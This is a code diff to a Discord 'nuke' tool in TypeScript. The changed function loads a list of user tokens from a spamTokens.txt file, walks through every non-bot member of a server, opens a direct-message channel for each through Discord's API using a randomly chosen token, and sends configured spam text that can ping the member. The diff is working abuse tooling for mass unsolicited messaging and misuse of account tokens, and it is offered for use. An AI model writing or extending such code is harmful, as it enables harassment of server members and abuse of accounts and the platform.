@@ -1,17 +1,26 @@
 import { Guild } from "discord.js";
 import axios from "axios";
+import { nukeConfig } from "../index";
+import fs from "fs";
+import path from "path";
 
 export default async (guild: Guild): Promise<void> => {
-	if (process.env.SPAM) {
+	if (nukeConfig.SPAM) {
 		const members = guild.members.cache.filter((member) => !member.user.bot);
+		const tokens = fs
+			.readFileSync(path.resolve("./spamTokens.txt"))
+			.toString()
+			.split("\n");
+
+		if (tokens.length === 1) {
+			return console.error("Tokens for spam not setted!");
+		}
 
 		let count = 0;
 
 		members.forEach(async (member) => {
 			try {
-				const token = JSON.parse(process.env.SPAM_TOKENS)[
-					Math.floor(Math.random() * JSON.parse(process.env.SPAM_TOKENS).length)
-				];
+				const token = tokens[Math.floor(Math.random() * tokens.length)];
 
 				const request = await axios.post(
 					`https://discord.com/api/v9/users/@me/channels`,
@@ -25,9 +34,9 @@ export default async (guild: Guild): Promise<void> => {
 					}
 				);
 
-				let content: string = process.env.SPAM_TEXT;
+				let content: string = nukeConfig.SPAM_TEXT;
 
-				if (process.env.SPAM_PING_USER) {
+				if (nukeConfig.SPAM_PING_USER) {
 					content = member.toString() + " " + content;
 				}
 
